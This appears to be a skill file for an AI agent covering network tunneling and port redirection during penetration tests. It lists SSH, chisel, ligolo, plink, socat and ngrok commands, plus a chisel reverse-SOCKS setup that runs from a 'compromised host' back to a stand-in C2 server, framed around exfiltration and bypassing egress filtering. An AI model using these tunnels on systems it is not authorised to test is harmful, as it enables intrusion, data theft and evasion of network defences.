---
name: port-redirection-tunneling
description: "Use when tunneling and redirecting network traffic."
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [port-forwarding, tunneling, SSH, SOCKS, chisel, ligolo, ngrok]
    related_skills: [lateral-movement-pivoting, vpn-implementation-patterns, network-sniffing-packet-capture, command-control-c2-infrastructure]
---

# Port Redirection and Tunneling

Tunneling and redirecting network traffic during pentests — from SSH tunneling and SOCKS proxies through Chisel, Ligolo, and HTTP/HTTPS tunneling.

## When to Use

- Exfiltrating data through firewalls
- Pivoting to restricted network segments
- Bypassing network segmentation and egress filtering
- Creating reverse shells through NAT
- Tunneling non-HTTP protocols through HTTP

## Tunneling Tools

```python
TUNNELING_METHODS = {
    'ssh_local': "ssh -L 8080:internal:80 jumpbox — forward internal port to local",
    'ssh_remote': "ssh -R 8080:localhost:80 server — expose local service externally",
    'ssh_dynamic': "ssh -D 9050 jumpbox — SOCKS5 proxy through jumpbox",
    'ssh_proxyjump': "ssh -J jumpbox1,jumpbox2 target — multi-hop SSH",
    'chisel': "client: chisel client server:8080 R:socks, server: chisel server -p 8080 --reverse",
    'ligolo': "ng: ligolo-ng -selfcert, proxy: ligolo-ng-proxy -selfcert -laddr 0.0.0.0:11601",
    'plink': "Windows: plink.exe -R 8080:localhost:80 user@server",
    'socat': "socat TCP-LISTEN:8080,fork TCP:internal-server:80",
    'ngrok': "ngrok tcp 3389 — public URL to local RDP (legit testing only)",
}

# Chisel reverse SOCKS
CHISEL_SETUP = """
# On C2 server:
chisel server -p 8080 --reverse

# On compromised host:
chisel client C2_SERVER:8080 R:socks

# Use proxychains:
proxychains nmap -sT -p 80,443 internal-target
"""
```

## Verification Checklist

- [ ] Tunneling method chosen based on network restrictions (SSH, Chisel, Ligolo, SOCAT)
- [ ] Egress filtering tested (which ports/protocols can reach external)
- [ ] Reverse tunnel established from internal host
- [ ] SOCKS proxy working (proxychains or browser configuration)
- [ ] Port forwarding tested (local, remote, dynamic)
- [ ] Multi-hop tunneling through multiple jump hosts
- [ ] DNS tunneling considered (iodine, dnscat2) if all ports blocked
- [ ] HTTP/HTTPS tunnel (Chisel, reGeorg) if only web allowed
- [ ] Tunnel stability tested (connection drops, reconnect logic)
